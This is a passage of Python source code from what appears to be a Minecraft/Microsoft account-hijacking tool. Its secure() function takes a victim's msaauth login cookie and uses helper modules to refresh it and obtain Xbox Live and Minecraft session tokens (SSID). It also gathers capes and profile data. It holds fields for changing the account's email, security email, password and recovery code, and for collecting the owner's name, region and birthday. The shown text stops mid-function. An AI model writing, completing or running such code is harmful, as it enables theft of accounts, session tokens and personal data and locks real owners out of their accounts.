from views.utils.getCookies import getCookies
from views.utils.polishHost import polishHost
from views.utils.getProfile import getProfile
from views.utils.getMethod import getMethod
from views.utils.getCapes import getCapes
from views.utils.getSSID import getSSID
from views.utils.getXBL import getXBL

def secure(msaauth: str):

    accountInfo = {
        "oldName": "Failed to Get",
        "newName": "Couldn't Change!",
        "oldEmail": "Couldn't Find",
        "email": "Couldn't Change!",
        "secEmail": "Couldn't Change!",
        "password": "Couldn't Change!",
        "recoveryCode": "Couldn't Change!",
        "loginCookie": "Failed to Get",
        "status": "Unknown",
        "timeTaken": 0,
        "SSID": "Failed to Get",
        "firstName": "Failed to Get",
        "lastName": "Failed to Get",
        "fullName": "Failed to Get",
        "region": "Failed to Get",
        "birthday": "Failed to Get",
        "method": "Unknown",
        "capes": []
    }
    
    cookies = getCookies() # [canary, apicanary, amsc]
    print("[+] - Got Cookies! Polishing login cookie...")
    host = polishHost(msaauth, cookies[2])
    if host == "Locked":
        accountInfo["email"] = "Locked"
        accountInfo["secEmail"] = "Locked"
        accountInfo["recoveryCode"] = "Locked"
        accountInfo["password"] = "Locked"
        accountInfo["status"] = "Locked"

        return accountInfo

    if host == "Down":
        accountInfo["email"] = "Microsoft Down"
        accountInfo["secEmail"] = "Microsoft Down"
        accountInfo["recoveryCode"] = "Microsoft Down"
        accountInfo["password"] = "Microsoft Down"
        accountInfo["status"] = "Microsoft Down"

        return accountInfo
    
    print("[~] - Checking Minecraft Account")
    XBLResponse = getXBL(host)
    
    xbl = XBLResponse["xbl"]
    ssid =  getSSID(xbl)

    if ssid:
        print("[+] - Got SSID!")
        accountInfo["SSID"] = ssid

        # Might replace with a non ssid request (uuid based)
        capes = getCapes(ssid)
        if capes:
            accountInfo["capes"] = ", ".join(i["alias"] for i in capes)
        else:
            accountInfo["capes"] = "No Capes"
        
        profile = getProfile(ssid)
        if not profile:
            accountInfo["oldName"] = "No Minecraft"
            print("[x] - Failed to get profile")
        else:
            print(f"[+] - Got profile")
            accountInfo["oldName"] = profile

        method = getMethod(ssid)
            
        

        